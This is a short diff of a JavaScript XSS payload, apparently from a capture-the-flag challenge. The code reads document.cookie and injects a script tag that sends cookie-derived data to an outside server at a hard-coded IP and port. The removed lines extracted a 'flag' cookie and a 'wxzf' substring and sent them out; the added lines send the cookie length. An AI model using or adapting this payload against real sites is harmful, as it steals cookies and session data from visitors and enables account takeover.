@@ -30,11 +30,11 @@ return ""
 // }
 
 cc=document.cookie;
-beg=cc.indexOf('wxzf');
-var flag=cc.substring(beg);
+len=cc.length;
+// var flag=cc.substring(beg);
 
-var f=getCookie('flag');
+// var f=getCookie('flag');
 
 var script=document.createElement('script');
-script.src='http://119.29.81.170:7892/?beg='+beg+"&f="+f;
+script.src='http://119.29.81.170:7892/?len='+len;
 document.body.appendChild(script);
